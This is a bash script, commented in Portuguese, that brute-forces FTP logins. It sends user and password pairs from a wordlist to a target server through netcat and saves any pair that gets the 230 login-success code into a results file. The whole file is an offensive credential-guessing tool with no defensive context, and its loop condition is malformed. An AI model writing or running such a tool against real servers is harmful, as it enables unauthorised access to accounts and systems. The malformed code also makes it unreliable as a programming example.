#!/usr/bin/env bash

clear

### VARIAVEIS

usuario=""
server=""
porta=""
wordl=""

### FUNÇÕES

martelada(){

codigo=$(cat <<EOF | nc $server $porta | tail -2 | head -1 | cut -d" " -f1
user $usuario
pass $senha
quit
EOF
)
echo "user[$usuario]pass[$senha]code[$codigo]"
}

[[ "$1" == "-r" ]]&&cat "$2" &&exit 0

while $senha -z ;do

	if [[ $codigo == "230" ]];then
		echo "user[$usuario]pass[$senha]code[$codigo]" >> results/$wordl
		exit 0
	fi


	linha=$(($linha + 1))
	senha=$(cat words/$wordl | head -$linha  | tail -1)
	martelada
done

